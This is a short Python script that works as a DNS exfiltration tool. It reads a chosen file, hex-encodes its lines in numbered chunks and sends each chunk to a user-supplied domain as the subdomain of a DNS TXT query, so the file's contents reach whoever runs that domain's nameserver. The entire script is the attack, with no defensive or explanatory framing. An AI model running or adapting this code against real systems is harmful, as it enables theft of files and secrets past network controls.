#!/usr/bin/env python3

import dns.resolver
import binascii
import argparse
import time

nonce='x6hq4'

def break_line(string, length):
    return (string[0+i:length+i] for i in range(0, len(string), length))

parser = argparse.ArgumentParser()
parser.add_argument('--domain','-d',required=True)
parser.add_argument('--file','-f',required=True)
args = parser.parse_args()

num = 1
with open (args.file,"r") as work_file:
	for line in work_file:
		for piece in break_line(line.rstrip(),24):
			#string = ("%s\t%s\n"%(str(num).rjust(5,'0'),piece))
			string = ("%s\t%s\t%s\n"%(f'{num:05}',args.file,piece))
			encoded_string = binascii.hexlify(string.encode('utf-8')) 
			tld = ("d.%s.%s.%s"%(encoded_string.decode('utf-8'),nonce,args.domain))
			dns.resolver.query(tld,'TXT')
			#answers = dns.resolver.query(tld,'TXT')
			#for i in answers:
			#	print("%s -> %s"%(string,i))	
			num += 1
			#time.sleep(1)
work_file.close()
exit()
